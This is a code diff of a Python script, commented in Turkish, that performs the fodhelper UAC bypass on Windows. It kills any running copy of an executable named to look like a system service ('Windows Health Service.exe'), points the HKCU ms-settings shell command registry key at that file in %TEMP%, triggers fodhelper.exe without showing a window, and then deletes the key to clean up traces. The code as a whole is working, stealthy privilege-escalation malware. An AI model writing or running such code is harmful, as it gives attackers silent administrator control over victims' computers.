@@ -4,57 +4,58 @@ import subprocess
 import time
 import sys
 
-def is_process_running(process_name):
+def kill_process(process_name):
+    """Çalışan eski süreci kapatır."""
     try:
-        # Tasklist çıktısını alırken pencere açılmasını engelle
-        output = subprocess.check_output(
-            f'tasklist /FI "IMAGENAME eq {process_name}"', 
+        # /F zorla kapatır, /IM isim ile kapatır, /T alt süreçleri de kapatır
+        subprocess.run(
+            f'taskkill /F /IM "{process_name}" /T', 
             shell=True, 
             creationflags=subprocess.CREATE_NO_WINDOW
-        ).decode(errors='ignore')
-        return process_name.lower() in output.lower()
+        )
+        # Kapanması için kısa bir süre bekle
+        time.sleep(2)
     except:
-        return False
+        pass
 
 def bypass_uac_and_run(exe_path):
     target_name = "Windows Health Service.exe"
     
-    # Eğer zaten çalışıyorsa sessizce çık
-    if is_process_running(target_name):
-        sys.exit()
+    # 1. ADIM: Eski olanı kapat
+    kill_process(target_name)
 
     reg_path = r'Software\Classes\ms-settings\shell\open\command'
-    
-    # %temp% yolunu güvenli şekilde çöz
     temp_folder = os.environ.get('TEMP')
-    full_path = os.path.join(temp_folder, "Windows Health Service.exe")
+    full_path = os.path.join(temp_folder, target_name)
 
+    # Dosya kontrolü
     if not os.path.exists(full_path):
-        sys.exit()
+        return
 
     try:
-        # Kayıt defteri işlemlerini sessizce yap
+        # 2. ADIM: Kayıt defteri işlemleri (Bypass için)
         winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
         with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE) as key:
-            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, full_path)
+            # Boşluklu yollar için çift tırnak önemli
+            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, f'"{full_path}"')
             winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
         
-        # fodhelper'ı hiçbir pencere açmadan tetikle
+        # 3. ADIM: Yeni kopyayı tetikle
         subprocess.run(
             "fodhelper.exe", 
             shell=True, 
             creationflags=subprocess.CREATE_NO_WINDOW
         )
         
-        # Sistemin işlemesi için bekle
-        time.sleep(3)
+        # Kayıt defterinin okunması için bekle
+        time.sleep(5)
 
-        # İzleri temizle
+        # 4. ADIM: İzleri temizle
         winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)
 
     except:
         pass
 
 if __name__ == "__main__":
-    target_exe = "Windows Health Service.exe"
-    bypass_uac_and_run(target_exe)
+    # Ekrana hiçbir çıktı vermez ve her şeyi arka planda yapar
+    bypass_uac_and_run("")
